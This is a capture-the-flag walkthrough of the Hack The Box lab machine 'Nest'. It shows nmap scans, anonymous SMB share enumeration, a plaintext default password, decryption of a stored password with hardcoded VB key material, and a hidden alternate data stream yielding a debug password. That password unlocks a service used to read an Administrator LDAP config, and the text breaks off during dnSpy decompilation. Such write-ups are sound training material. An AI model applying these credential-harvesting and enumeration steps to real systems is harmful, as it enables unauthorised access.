# Nest

```
root@kali:/home/kali/htb/Nest# nmap -p- -sC -sV 10.129.114.52
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 10:32 EDT
Nmap scan report for 10.129.114.52
Host is up (0.029s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     Reporting Service V1.2
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     Reporting Service V1.2
|     Unrecognised command
|   Help: 
|     Reporting Service V1.2
|     This service allows users to run queries against databases using the legacy HQK format
|     AVAILABLE COMMANDS ---
|     LIST
|     SETDIR <Directory_Name>
|     RUNQUERY <Query_ID>
|     DEBUG <Password>
|_    HELP <Command>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4386-TCP:V=7.91%I=7%D=3/15%Time=604F7083%P=x86_64-pc-linux-gnu%r(NU
SF:LL,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(GenericLin
SF:es,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognise
SF:d\x20command\r\n>")%r(GetRequest,3A,"\r\nHQK\x20Reporting\x20Service\x2
SF:0V1\.2\r\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(HTTPOptions,3A,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20comma
SF:nd\r\n>")%r(RTSPRequest,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\
SF:n\r\n>\r\nUnrecognised\x20command\r\n>")%r(RPCCheck,21,"\r\nHQK\x20Repo
SF:rting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSVersionBindReqTCP,21,"\r\nHQK
SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(DNSStatusRequestTCP,21,"
SF:\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Help,F2,"\r\nHQK\
SF:x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nThis\x20service\x20allows\
SF:x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\x20th
SF:e\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x20---
SF:\r\n\r\nLIST\r\nSETDIR\x20<Directory_Name>\r\nRUNQUERY\x20<Query_ID>\r\
SF:nDEBUG\x20<Password>\r\nHELP\x20<Command>\r\n>")%r(SSLSessionReq,21,"\r
SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServerCooki
SF:e,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(TLSSessionR
SF:eq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(Kerberos,2
SF:1,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(SMBProgNeg,21,
SF:"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(X11Probe,21,"\r\
SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>")%r(FourOhFourRequest,3A
SF:,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n>\r\nUnrecognised\x20
SF:command\r\n>")%r(LPDString,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(LDAPSearchReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.
SF:2\r\n\r\n>")%r(LDAPBindReq,21,"\r\nHQK\x20Reporting\x20Service\x20V1\.2
SF:\r\n\r\n>")%r(SIPOptions,3A,"\r\nHQK\x20Reporting\x20Service\x20V1\.2\r
SF:\n\r\n>\r\nUnrecognised\x20command\r\n>")%r(LANDesk-RC,21,"\r\nHQK\x20R
SF:eporting\x20Service\x20V1\.2\r\n\r\n>")%r(TerminalServer,21,"\r\nHQK\x2
SF:0Reporting\x20Service\x20V1\.2\r\n\r\n>");

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-15T14:37:17
|_  start_date: 2021-03-15T13:27:01

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 303.73 seconds
root@kali:/home/kali/htb/Nest# 
```

I connect to the unknown port with `nc 10.129.114.53 4386`

It responds with `HQK Reporting Service V1.2`

I google this, and immediately see exploits. https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/

I briefly check it out, but I decide to check out the smb share before I spend time on the exploit.

```
root@kali:/home/kali/htb/Nest# smbclient -L //10.129.114.52/ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Data            Disk      
        IPC$            IPC       Remote IPC
        Secure$         Disk      
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.114.52 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

I also run enum4linux, but it did not really give any info.

I then run smbmap with a null user to see the permissions:

```
root@kali:/home/kali/htb/Nest# smbmap -H 10.129.114.52 -u 'null'
[+] Guest session       IP: 10.129.114.52:445   Name: 10.129.114.52                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 NO ACCESS
        Users                                                   READ ONLY
root@kali:/home/kali/htb/Nest# 
```

Then I go in with smbclient:

```
root@kali:/home/kali/htb/Nest# smbclient -N //10.129.114.52/Data
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Aug  7 18:53:46 2019
  ..                                  D        0  Wed Aug  7 18:53:46 2019
  IT                                  D        0  Wed Aug  7 18:58:07 2019
  Production                          D        0  Mon Aug  5 17:53:38 2019
  Reports                             D        0  Mon Aug  5 17:53:44 2019
  Shared                              D        0  Wed Aug  7 15:07:51 2019

                10485247 blocks of size 4096. 6542864 blocks available
smb: \> 
```

I find a file with some creds:

```
smb: \Shared\Templates\HR\> more "Welcome Email.txt"
getting file \Shared\Templates\HR\Welcome Email.txt of size 425 as /tmp/smbmore.8N9p1K (3.8 KiloBytes/sec) (average 2.1 KiloBytes/sec)
smb: \Shared\Templates\HR\> 

We would like to extend a warm welcome to our newest member of staff, <FIRSTNAME> <SURNAME>

You will find your home folder in the following location: 
\\HTB-NEST\Users\<USERNAME>

If you have any issues accessing specific services or workstations, please inform the 
IT department and use the credentials below until all systems have been set up for you.

Username: TempUser
Password: welcome2019


Thank you
HR
/tmp/smbmore.8N9p1K (END)

```

I then use these creds to check out the smbmap of the tempuser:

```
root@kali:/home/kali/htb/Nest# smbmap -H 10.129.114.52 -u 'TempUser' -p "welcome2019"
[+] IP: 10.129.114.52:445       Name: 10.129.114.52                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY
root@kali:/home/kali/htb/Nest# smbclient //10.129.114.52/Users -U "TempUser"
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 25 18:04:21 2020
  ..                                  D        0  Sat Jan 25 18:04:21 2020
  Administrator                       D        0  Fri Aug  9 11:08:23 2019
  C.Smith                             D        0  Sun Jan 26 02:21:44 2020
  L.Frost                             D        0  Thu Aug  8 13:03:01 2019
  R.Thompson                          D        0  Thu Aug  8 13:02:50 2019
  TempUser                            D        0  Wed Aug  7 18:55:56 2019

                10485247 blocks of size 4096. 6542864 blocks available
smb: \> 
```

The TempUser dir only contains an empty text file, so let's check out the Secure$ Disk:

And there I have no access.

Since we got new creds, I go back into the Data directory and I now have access to some new folders.

After confirming, I mount the share for easier access:

```
root@kali:/home/kali/htb/Nest# mount -t cifs //10.129.114.52/Data /mnt/smb -o username=TempUser,password=welcome2019,domain=WORKGROUP,rw
root@kali:/home/kali/htb/Nest# cd /mnt/smb
root@kali:/mnt/smb# ls
IT  Production  Reports  Shared
root@kali:/mnt/smb/# cd IT
root@kali:/mnt/smb/IT# tree
.
├── Archive
├── Configs
│   ├── Adobe
│   │   ├── editing.xml
│   │   ├── Options.txt
│   │   ├── projects.xml
│   │   └── settings.xml
│   ├── Atlas
│   │   └── Temp.XML
│   ├── DLink
│   ├── Microsoft
│   │   └── Options.xml
│   ├── NotepadPlusPlus
│   │   ├── config.xml
│   │   └── shortcuts.xml
│   ├── RU Scanner
│   │   └── RU_config.xml
│   └── Server Manager
├── Installs
├── Reports
└── Tools

12 directories, 9 files
root@kali:/mnt/smb/IT# 
```

I check out the files, staring with config files. as they can often contain creds.

Configs/NotepadPlusPlus/config.xml has this:

```
        <File filename="C:\windows\System32\drivers\etc\hosts" />
        <File filename="\\HTB-NEST\Secure$\IT\Carl\Temp.txt" />
        <File filename="C:\Users\C.Smith\Desktop\todo.txt" />

```

So we could maybe see if we have access to these folders. And maybe use the format of \IT\<FirstName> to get other files.


I also find some possible creds in Configs/RU Scanner/RU_config:

```
root@kali:/mnt/smb/IT# cat Configs/RU\ Scanner/RU_config.xml 
<?xml version="1.0"?>
<ConfigFile xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>389</Port>
  <Username>c.smith</Username>
  <Password>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=</Password>
</ConfigFile>
root@kali:/mnt/smb/IT# echo "fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=" | base64 -d ; echo;
}13��=X�J�BA�X*�Wc�f���?βc
root@kali:/mnt/smb/IT# 

```

```
root@kali:/mnt/smb/IT# smbclient //10.129.114.52/Secure$ -U "TempUser"
Enter WORKGROUP\TempUser's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Aug  7 19:08:12 2019
  ..                                  D        0  Wed Aug  7 19:08:12 2019
  Finance                             D        0  Wed Aug  7 15:40:13 2019
  HR                                  D        0  Wed Aug  7 19:08:11 2019
  IT                                  D        0  Thu Aug  8 06:59:25 2019

                10485247 blocks of size 4096. 6542864 blocks available
smb: \> cd IT
smb: \IT\> cd CArl
smb: \IT\CArl\> dir
  .                                   D        0  Wed Aug  7 15:42:14 2019
  ..                                  D        0  Wed Aug  7 15:42:14 2019
  Docs                                D        0  Wed Aug  7 15:44:00 2019
  Reports                             D        0  Tue Aug  6 09:45:40 2019
  VB Projects                         D        0  Tue Aug  6 10:41:55 2019

                10485247 blocks of size 4096. 6542864 blocks available
smb: \IT\CArl\> 
```

In here, I find a Visual Basic file. I suspect we have to use the base64 encoded password with the project somehow. Maybe it is running on the open port.

```
root@kali:/home/kali/htb/Nest# smbget -R smb://10.129.114.52/Secure$/IT/Carl -U TempUser
Password for [TempUser] connecting to //Secure$/10.129.114.52: 
Using workgroup WORKGROUP, user TempUser
smb://10.129.114.52/Secure$/IT/Carl/Docs/ip.txt                                                                                                             
smb://10.129.114.52/Secure$/IT/Carl/Docs/mmc.txt                                                                                                            
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/ConfigFile.vb                                                                              
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Module1.vb                                                                                 
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.Designer.vb                                                         
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Application.myapp                                                               
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/AssemblyInfo.vb                                                                 
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.Designer.vb                                                           
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Resources.resx                                                                  
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.Designer.vb                                                            
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/My Project/Settings.settings                                                               
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj                                                                          
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/RU Scanner.vbproj.user                                                                     
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/SsoIntegration.vb                                                                          
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner/Utils.vb                                                                                   
smb://10.129.114.52/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln                                                                                        
Downloaded 25.18kB in 8 seconds
root@kali:/home/kali/htb/Nest# 
```

-R here simply just means get everything recursively.

```
root@kali:/home/kali/htb/Nest/VB Projects# tree
.
├── Production
└── WIP
    └── RU
        ├── RUScanner
        │   ├── bin
        │   │   ├── Debug
        │   │   └── Release
        │   ├── ConfigFile.vb
        │   ├── Module1.vb
        │   ├── My Project
        │   │   ├── Application.Designer.vb
        │   │   ├── Application.myapp
        │   │   ├── AssemblyInfo.vb
        │   │   ├── Resources.Designer.vb
        │   │   ├── Resources.resx
        │   │   ├── Settings.Designer.vb
        │   │   └── Settings.settings
        │   ├── obj
        │   │   └── x86
        │   ├── RU Scanner.vbproj
        │   ├── RU Scanner.vbproj.user
        │   ├── SsoIntegration.vb
        │   └── Utils.vb
        └── RUScanner.sln

10 directories, 14 files
root@kali:/home/kali/htb/Nest/VB Projects# 

```

Let's see if we can find something good here:

```
root@kali:/home/kali/htb/Nest/VB Projects/WIP/RU/RUScanner# grep -R "word" 2>/dev/null
My Project/Settings.Designer.vb:        <Global.System.ComponentModel.Design.HelpKeywordAttribute("My.Settings")>  _
Module1.vb:        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
Utils.vb:                                    ByVal passwordIterations As Integer, _
Utils.vb:        Dim password As New Rfc2898DeriveBytes(passPhrase, _
Utils.vb:                                           passwordIterations)
Utils.vb:        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
Utils.vb:                                    ByVal passwordIterations As Integer, _
Utils.vb:        Dim password As New Rfc2898DeriveBytes(passPhrase, _
Utils.vb:                                           passwordIterations)
Utils.vb:        keyBytes = password.GetBytes(CInt(keySize / 8))
ConfigFile.vb:    Public Property Password As String
SsoIntegration.vb:    Public Property Password As String
root@kali:/home/kali/htb/Nest/VB Projects/WIP/RU/RUScanner#
```

So we are clearly using some sort of username and password here.

```
root@kali:/home/kali/htb/Nest/VB Projects/WIP/RU/RUScanner# cat Module1.vb 
Module Module1

    Sub Main()
        Dim Config As ConfigFile = ConfigFile.LoadFromFile("RU_Config.xml")
        Dim test As New SsoIntegration With {.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)}
       


    End Sub

End Module
root@kali:/home/kali/htb/Nest/VB Projects/WIP/RU/RUScanner# 
```

so Module1 is using the Utils module to decrypt the password.

```
root@kali:/home/kali/htb/Nest/VB Projects/WIP/RU/RUScanner# cat Utils.vb 
Imports System.Text
Imports System.Security.Cryptography
Public Class Utils

    Public Shared Function GetLogFilePath() As String
        Return IO.Path.Combine(Environment.CurrentDirectory, "Log.txt")
    End Function




    Public Shared Function DecryptString(EncryptedString As String) As String
        If String.IsNullOrEmpty(EncryptedString) Then
            Return String.Empty
        Else
            Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function EncryptString(PlainString As String) As String
        If String.IsNullOrEmpty(PlainString) Then
            Return String.Empty
        Else
            Return Encrypt(PlainString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
        End If
    End Function

    Public Shared Function Encrypt(ByVal plainText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)
        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)
        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)
        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)
        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))
        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC
        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)
        Using memoryStream As New IO.MemoryStream()
            Using cryptoStream As New CryptoStream(memoryStream, _
                                            encryptor, _
                                            CryptoStreamMode.Write)
                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                cryptoStream.FlushFinalBlock()
                Dim cipherTextBytes As Byte() = memoryStream.ToArray()
                memoryStream.Close()
                cryptoStream.Close()
                Return Convert.ToBase64String(cipherTextBytes)
            End Using
        End Using
    End Function

    Public Shared Function Decrypt(ByVal cipherText As String, _
                                   ByVal passPhrase As String, _
                                   ByVal saltValue As String, _
                                    ByVal passwordIterations As Integer, _
                                   ByVal initVector As String, _
                                   ByVal keySize As Integer) _
                           As String

        Dim initVectorBytes As Byte()
        initVectorBytes = Encoding.ASCII.GetBytes(initVector)

        Dim saltValueBytes As Byte()
        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

        Dim cipherTextBytes As Byte()
        cipherTextBytes = Convert.FromBase64String(cipherText)

        Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                           saltValueBytes, _
                                           passwordIterations)

        Dim keyBytes As Byte()
        keyBytes = password.GetBytes(CInt(keySize / 8))

        Dim symmetricKey As New AesCryptoServiceProvider
        symmetricKey.Mode = CipherMode.CBC

        Dim decryptor As ICryptoTransform
        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

        Dim memoryStream As IO.MemoryStream
        memoryStream = New IO.MemoryStream(cipherTextBytes)

        Dim cryptoStream As CryptoStream
        cryptoStream = New CryptoStream(memoryStream, _
                                        decryptor, _
                                        CryptoStreamMode.Read)

        Dim plainTextBytes As Byte()
        ReDim plainTextBytes(cipherTextBytes.Length)

        Dim decryptedByteCount As Integer
        decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                               0, _
                                               plainTextBytes.Length)

        memoryStream.Close()
        cryptoStream.Close()

        Dim plainText As String
        plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                            0, _
                                            decryptedByteCount)

        Return plainText
    End Function






End Class

```

I google vb online compiler and find https://www.onlinegdb.com/online_vb_compiler.

So I copy in the Utils.vb code to start with.


I take the sub Main code from Module1.vb, and remove the config to hard-code in the values we found earlier.

I take the SsoIntegration public class from SsoIntegration.vb

I delete the Encryption functions, import System. And write the return to System.Console.WriteLine

```
Imports System.Text
Imports System.Security.Cryptography
Imports System
Public Class Utils


Public Shared Function DecryptString(EncryptedString As String) As String
    If String.IsNullOrEmpty(EncryptedString) Then
        Return String.Empty
    Else
        Return Decrypt(EncryptedString, "N3st22", "88552299", 2, "464R5DFA5DL6LE28", 256)
    End If
End Function

    

Public Shared Function Decrypt(ByVal cipherText As String, _
                               ByVal passPhrase As String, _
                               ByVal saltValue As String, _
                               ByVal passwordIterations As Integer, _
                               ByVal initVector As String, _
                               ByVal keySize As Integer) _
                       As String

    Dim initVectorBytes As Byte()
    initVectorBytes = Encoding.ASCII.GetBytes(initVector)

    Dim saltValueBytes As Byte()
    saltValueBytes = Encoding.ASCII.GetBytes(saltValue)

    Dim cipherTextBytes As Byte()
    cipherTextBytes = Convert.FromBase64String(cipherText)

    Dim password As New Rfc2898DeriveBytes(passPhrase, _
                                       saltValueBytes, _
                                       passwordIterations)

    Dim keyBytes As Byte()
    keyBytes = password.GetBytes(CInt(keySize / 8))

    Dim symmetricKey As New AesCryptoServiceProvider
    symmetricKey.Mode = CipherMode.CBC

    Dim decryptor As ICryptoTransform
    decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)

    Dim memoryStream As IO.MemoryStream
    memoryStream = New IO.MemoryStream(cipherTextBytes)

    Dim cryptoStream As CryptoStream
    cryptoStream = New CryptoStream(memoryStream, _
                                    decryptor, _
                                    CryptoStreamMode.Read)

    Dim plainTextBytes As Byte()
    ReDim plainTextBytes(cipherTextBytes.Length)

    Dim decryptedByteCount As Integer
    decryptedByteCount = cryptoStream.Read(plainTextBytes, _
                                           0, _
                                           plainTextBytes.Length)

    memoryStream.Close()
    cryptoStream.Close()

    Dim plainText As String
    plainText = Encoding.ASCII.GetString(plainTextBytes, _
                                        0, _
                                        decryptedByteCount)
	System.Console.WriteLine(plainText)
    Return plainText
End Function
    
Public Class SsoIntegration

    Public Property Username As String
    Public Property Password As String


End Class

    

    Sub Main()
        Dim test As New SsoIntegration With {.Username = "c.smith", .Password = Utils.DecryptString("fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=")}

    End Sub

End Class
```

For some reason it did not run. No online compilers would accept the imports except https://dotnetfiddle.net/#

When I ran it on dotnetfiddle I recieved: `xRxRxPANCAK3SxRxRx`

I verified these creds with smbmap:

```
root@kali:/mnt/smb/IT# smbmap -H 10.129.114.52 -u 'c.smith' -p 'xRxRxPANCAK3SxRxRx'
[+] IP: 10.129.114.52:445       Name: 10.129.114.52                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Data                                                    READ ONLY
        IPC$                                                    NO ACCESS       Remote IPC
        Secure$                                                 READ ONLY
        Users                                                   READ ONLY
root@kali:/mnt/smb/IT# 
```


I go into the Users Disk with this user, and retrieve the user.txt flag. There was also a HQK Reporting folder. With an interesting exe file.

```
smb: \C.Smith\HQK Reporting\> recurse on
smb: \C.Smith\HQK Reporting\> prompt off
smb: \C.Smith\HQK Reporting\> mget *
getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (122.3 KiloBytes/sec) (average 122.3 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt of size 0 as Debug Mode Password.txt (0.0 KiloBytes/sec) (average 68.8 KiloBytes/sec)
getting file \C.Smith\HQK Reporting\HQK_Config_Backup.xml of size 249 as HQK_Config_Backup.xml (2.2 KiloBytes/sec) (average 48.4 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> ^C

root@kali:/home/kali/htb/Nest# cat HQK_Config_Backup.xml 
<?xml version="1.0"?>
<ServiceSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Port>4386</Port>
  <QueryDirectory>C:\Program Files\HQK\ALL QUERIES</QueryDirectory>
</ServiceSettings>root@kali:/home/kali/htb/Nest# 
``` 

I throw the .exe into ghidra. But I don't really find anything all that useful.

I open it up in a hexeditor to see if there's anything there. I run strings on it. Nothing. I then do the same on the text file and xml file. But I cannot find anything.

I go back into Users to see if there's anything more I can get. Same with Secure$.

I run help on smb to see if there's anything that shows hidden files or something.

```
smb: \C.Smith\HQK Reporting\> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
more           mput           newer          notify         open           
posix          posix_encrypt  posix_open     posix_mkdir    posix_rmdir    
posix_unlink   posix_whoami   print          prompt         put            
pwd            q              queue          quit           readlink       
rd             recurse        reget          rename         reput          
rm             rmdir          showacls       setea          setmode        
scopy          stat           symlink        tar            tarmode        
timeout        translate      unlock         volume         vuid           
wdel           logon          listconnect    showconnect    tcon           
tdis           tid            utimes         logoff         ..             
!              
smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
altname: DEBUGM~1.TXT
create_time:    Thu Aug  8 07:06:12 PM 2019 EDT
access_time:    Thu Aug  8 07:06:12 PM 2019 EDT
write_time:     Thu Aug  8 07:08:17 PM 2019 EDT
change_time:    Thu Aug  8 07:08:17 PM 2019 EDT
attributes: A (20)
stream: [::$DATA], 0 bytes
stream: [:Password:$DATA], 15 bytes
smb: \C.Smith\HQK Reporting\> 
```

A secondary data-stream? I've been looking for so long, finally something new. Read more about data-streams here: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/

```
smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \C.Smith\HQK Reporting\> ^C
root@kali:/home/kali/htb/Nest# cat 'Debug Mode Password.txt:Password' 
WBQ201953D8w 
root@kali:/home/kali/htb/Nest# 
```

I tried enumerating this password with other users with smbmap, but it did not work.

After a good while I finally remembered the original port I tried out. And the DEBUG <password> command nmap gave me.

nc did not work, but when I tried telnet I got some response:

```
root@kali:/home/kali/htb/Nest# nc 10.129.114.52 4386 

HQK Reporting Service V1.2

>DEBUG WBQ201953D8w
help
HELP



^C
root@kali:/home/kali/htb/Nest# 
root@kali:/home/kali/htb/Nest# telnet 10.129.114.52 4386 
Trying 10.129.114.52...
Connected to 10.129.114.52.
Escape character is '^]'.

HQK Reporting Service V1.2

>DEBUG WBQ201953D8w

Debug mode enabled. Use the HELP command to view additional commands that are now available
>HELP

This service allows users to run queries against databases using the legacy HQK format

--- AVAILABLE COMMANDS ---

LIST
SETDIR <Directory_Name>
RUNQUERY <Query_ID>
DEBUG <Password>
HELP <Command>
SERVICE
SESSION
SHOWQUERY <Query_ID>

>

```

I play around with the commands a bit to get the feeling of how everything works. And I find that I can use `SETDIR ..`

```
>SETDIR ..

Current directory set to HQK
>SETDIR ..

Current directory set to Program Files
>SETDIR ..

Current directory set to C:
>LIST

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[DIR]  $Recycle.Bin
[DIR]  Boot
[DIR]  Config.Msi
[DIR]  Documents and Settings
[DIR]  PerfLogs
[DIR]  Program Files
[DIR]  Program Files (x86)
[DIR]  ProgramData
[DIR]  Recovery
[DIR]  Shares
[DIR]  System Volume Information
[DIR]  Users
[DIR]  Windows
[1]   bootmgr
[2]   BOOTSECT.BAK
[3]   pagefile.sys
[4]   restartsvc.bat

Current Directory: C:
>
```
I find some creds:

```
Current Directory: HQK
>setdir ldap

Current directory set to ldap
>list

Use the query ID numbers below with the RUNQUERY command and the directory names with the SETDIR command

 QUERY FILES IN CURRENT DIRECTORY

[1]   HqkLdap.exe
[2]   Ldap.conf

Current Directory: ldap
>showquery 2

Domain=nest.local
Port=389
BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
User=Administrator
Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=

>
```

I try to throw this into the vb code earlier, but it's not the correct length.

I already went through the file with ghidra, and I could not really understand it all that well.

I did see that it took a username and password. 

I try running it with wine, but it does not work.

So I copy it over to my host system which runs windows.

```
PS F:\dnSpy-net-win64\Nest> .\HqkLdap.exe .\Ldap.conf
Please ensure the optional database import module is installed
PS F:\dnSpy-net-win64\Nest>                                                                                                                          
```

Hmm. There has to be something with this, I google around a bit and eventually I find dnSpy. 

`dnSpy is a debugger and .NET assembly editor. You can use it to edit and debug assemblies even if you don't have any source code available.`

So we can use this to disassemble the .exe and edit it so we don't need the database.

I open it up with the dnSpy binary and search for the error message. Setting the filter to Number/String.

And I find the check:

```
Try
	If MyProject.Application.CommandLineArgs.Count <> 1 Then
		Console.WriteLine("Invalid number of command line arguments")
	ElseIf Not File.Exists(MyProject.Application.CommandLineArgs(0)) Then
		Console.WriteLine("Specified config file does not exist")
	ElseIf Not File.Exists("HqkDbImport.exe") Then
		Console.WriteLine("Please ensure the optional database import module is installed")
	Else
		Dim ldapSearchSettings As LdapSearchSettings = New LdapSearchSettings()
		Dim array As String() = File.ReadAllLines(MyProject.Application.CommandLineArgs(0))
		For Each text As String In array
			If text.StartsWith("Domain=", StringComparison.CurrentCultureIgnoreCase) Then
				ldapSearchSettings.Domain = text.Substring(text.IndexOf("="c) + 1)
			ElseIf text.StartsWith("User=", StringComparison.CurrentCultureIgnoreCase) Then
				ldapSearchSettings.Username = text.Substring(text.IndexOf("="c) + 1)
			ElseIf text.StartsWith("Password=", StringComparison.CurrentCultureIgnoreCase) Then
				ldapSearchSettings.Password = CR.DS(text.Substring(text.IndexOf("="c) + 1))
			End If
		Next
		Dim ldap As Ldap = New Ldap()
		ldap.Username = ldapSearchSettings.Username
		ldap.Password = ldapSearchSettings.Password
		ldap.Domain = ldapSearchSettings.Domain
		Console.WriteLine("Performing LDAP query...")
		Dim list As List(Of String) = ldap.FindUsers()
		Console.WriteLine(Conversions.ToString(list.Count) + " user accounts found. Importing to database...")
		Try
```


